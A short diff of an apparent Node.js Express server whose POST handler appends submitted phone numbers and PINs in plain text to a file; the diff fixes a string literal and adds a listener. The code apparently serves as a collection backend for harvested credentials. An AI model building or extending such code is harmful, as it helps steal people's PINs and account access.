@@ -27,9 +27,13 @@ app.post("/", (req, res) => {
         return res.sendStatus(400);
     }
 
-    const line = PHONE: ${phone} | PIN: ${pin}\n;
+    const line = `PHONE: ${phone} | PIN: ${pin}\n`;
     fs.appendFileSync(FILE, line);
 
     // ⚠️ fetch n’aime pas les redirect
     res.sendStatus(200);
+});
+
+app.listen(PORT, () => {
+    console.log("Serveur online sur port " + PORT);
 });
